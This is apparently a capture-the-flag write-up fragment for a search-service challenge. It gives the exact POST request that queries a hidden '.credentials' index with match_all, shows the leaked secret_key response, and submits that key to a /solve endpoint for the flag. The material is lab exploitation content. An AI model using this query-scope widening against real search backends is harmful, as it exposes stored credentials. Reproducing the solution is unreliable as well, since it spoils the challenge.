The full payload:

```
POST /search   {"index": ".credentials", "query": {"match_all": {}}}
```

You'll get a response like:

```
{"hits":{"hits":[{"_index":".credentials","_id":"flag",
                  "_source":{"secret_key":"<32 hex>","note":"..."}}]}}
```

Then submit:

```
POST /solve    {"secret_key":"<the 32-hex value>"}
```

`/solve` compares your submission constant-time and returns `FLAG{...}` on a
match. The value is unique per container.

(Painless `script_fields` would work too as a companion primitive to shape which
fields are returned — but the important step here is the scope-widening.)
